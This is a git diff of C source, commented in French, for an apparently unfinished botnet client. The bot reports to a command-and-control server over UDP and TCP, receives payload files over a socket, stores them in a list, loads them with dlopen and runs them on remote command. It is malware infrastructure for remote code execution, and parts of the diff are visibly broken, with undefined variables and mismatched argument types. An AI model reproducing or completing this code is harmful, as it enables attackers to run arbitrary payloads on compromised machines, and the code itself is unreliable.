@@ -15,11 +15,23 @@
 #include "utils.h"
 #include "bot.h"
 
-
+liste_cu_t list_CU;
 clock_t debut;
 charge_utile_t charge1;
 charge_utile_t charge2;
 
+/** void receptionCU(char *filename)
+ * Fonction permettant d'ajouter une charge utile dans la liste dédiée
+ * param nom de la charge utile
+ * 
+ */
+void receptionCU(char *filename)
+{
+    charge_utile_t *charge = (charge_utile_t *)malloc(sizeof(charge_utile_t));
+    strcpy(charge->nom, filename);
+    ajout_tete_cu(&list_CU, charge);
+    //print_listeCU(list_CU);
+}
 /**
  * void send_status(info_bot_t info, int socket_tcp)
  * Fonction qui envoie le statut du bot au CC sur la socket TCP
@@ -40,13 +52,15 @@ charge_utile_t charge2;
  * Fonction permettant d'exécuter une charge utile 
  * param structure de la charge utile 
  */
-void start_charge(charge_utile_t *structure)
+void start_charge(char *filename)
 {
     printf("[start_charge]Start\n");
-    
-    // TO DO : réfléchir sur le plugin ? var extern ?
+
+    // chercher dans la liste le nom de la structure
+    //TO DO : cas ou la charge n'est pas dans la liste => erreur
+    charge_utile_t *structure = rechercheCU(filename, &list_CU);
     // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
-    printf("je vais start le fichier : %s \n", structure->nom);
+    printf("Je vais start le fichier : %s \n", structure->nom);
     init_f start = dlsym(structure->plugin, "start");
     char *result = dlerror();
     if (result)
@@ -55,22 +69,9 @@ void start_charge(charge_utile_t *structure)
     }
     //dlclose(structure.nom);
     //Lancement de la fonction start dans un thread
+    //TO DO : remplir la variable executed et resultat
     printf("Lancement du thread sur la fonction chargée\n");
     start(NULL);
-    //lanceThread(start, NULL, 0);
-}
-/**
- * void print_CU_structure(charge_utile_t structure)
- * Fonction permettant d'imprimer le contenu d'une structure de charge utile
- * param une structure de charge utile
- */
-void print_CU_structure(charge_utile_t *structure)
-{
-    printf("*************** La structure de la charge utile ************ \n");
-    printf("Le nom du fichier dans la structure est : %s\n", structure->nom);
-    //printf("L'adresse ip dans la strcuture est  : %s\n", structure.);
-    //printf("L'état du résultat de la charge utile est : %c\n", structure.resultat);
-    //printf("L'état de l'exécution de la charge utile est : %c\n", structure.executed);
 }
 
 /**
@@ -79,42 +80,40 @@ void print_CU_structure(charge_utile_t *structure)
  * param le nom de la charge utile
  */
 
-void install_charge(char *file_name, charge_utile_t *structure)
+void install_charge(char *file_name)
 {
+    //chercher dans la liste la structure portant ce nom
+    charge_utile_t *structure = rechercheCU(file_name, &list_CU);
+    //si elle n'y est pas c'est qu'il y a erreur
     printf("[install_charge]Start\n");
-    void *plugin; // le mettre en extern ? => Non car il sera stocké plus tard dans une liste
     //Chargement du fichier en tant que librairie dynamique
     //file_name = PATH du fichier (relatif ou absolu)
-    plugin = dlopen(file_name, RTLD_NOW);
-    if (!plugin)
+    structure->plugin = dlopen(file_name, RTLD_NOW);
+    if (!structure->plugin)
     {
         printf("!!! %s\n", dlerror());
         return;
     }
-    // TO DO : créer une liste de charges utiles
-    structure->plugin = plugin;
-    strcpy(structure->nom, file_name);
-    print_CU_structure(structure);
-        // TO DO : Copier dans /usr/lib
+    // TO DO : Copier dans /usr/lib
     printf("La charge utile %s a bien été installée ! \n", file_name);
-    
 }
 
 void rm_charge(charge_utile_t *structure)
 {
     printf("[rm_charge]Start\n");
     printf("je vais supprimer le fichier : %s\n", structure->nom);
-    //TO DO : rm de la liste 
+    // rm de la liste
+    supp_elm_liste_CU(&list_CU, structure->nom);
     // TO DO : rm de la /usr/lib
 }
 
 //void receive_cmd_TCP(void *socket)
-/* void receive_cmd_TCP(void *arg)
+void receive_cmd_TCP(void *arg)
 {
     printf("[receive_cmd_TCP]Start\n");
     char cmd_recue;
     int socket_tcp = *((int *)socket);
-    // Obtient une structure de fichier 
+    // Obtient une structure de fichier
     FILE *dialogue = fdopen(socket_tcp, "a+");
     receiveTCP(socket_tcp, cmd_recue, sizeof(cmd_recue));
     printf("[receive_cmd_TCP]La cmd que j'ai lu de mon client TCP est : %c\n", cmd_recue);
@@ -131,13 +130,13 @@ void rm_charge(charge_utile_t *structure)
         break;
 
     case '2': //INSTALL
-        install_charge();
+        install_charge(filename);
         break;
     case '3': //START
-        start_charge();
+        start_charge(filename);
         break;
     case '4': //RM
-        rm_charge();
+        rm_charge(filename);
         break;
     case '5': //QUIT
         break;
@@ -148,7 +147,7 @@ void rm_charge(charge_utile_t *structure)
         perror("ReceiveFile.lanceThread");
         exit(-1);
     }
-} */
+}
 
 /**
  * void gestionClientTCP(void *s)
@@ -198,7 +197,7 @@ void recvFile(void *s)
     int file_size = atoi(buff);
     printf("[BOT] file size received is: %d\n", file_size);
     int remain_data = file_size;
-    /* https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
+    // https://stackoverflow.com/questions/11952898/c-send-and-receive-file
     while ((remain_data > 0) && ((len = recv(socket_tcp, buff, BUFSIZ, 0)) > 0))
     {
         fwrite(buff, sizeof(char), len, fp);
@@ -314,31 +313,21 @@ void partie_udp(clock_t debut)
     }
 }
 
-void creation_liste_CU(){
-
-    return ;
-}
-/** void ajout_CU_liste(charge_utile_t charge)
- * Fonction permettant de stocker les charges utiles dans une liste chainée
- */
-void ajout_CU_liste(charge_utile_t *charge,  llist *liste)
-{
-    llist_add_inorder(charge1, liste,int (*comp)(void *, void *));
-}
-
 int main()
 {
-    //clock_t debut = clock(); //prise de temps au moment du démarrage stricte du process
-    //srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand
+    clock_t debut = clock(); //prise de temps au moment du démarrage stricte du process
+    srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand
 
     // PARTIE envoie UDP en THREAD
-    //partie_udp(debut);
+    partie_udp(debut);
 
     // PARTIE SERVEUR TCP en THREAD
+    printf("PARTIE TCP\n");
+    init_listCU(&list_CU);
     //partie_tcp();
 
-    llist *list = llist_create(NULL);
-    ajout_CU_liste();
+    /* llist *list = llist_create(NULL);
+    ajout_CU_liste(); */
     while (1)
     {
     }
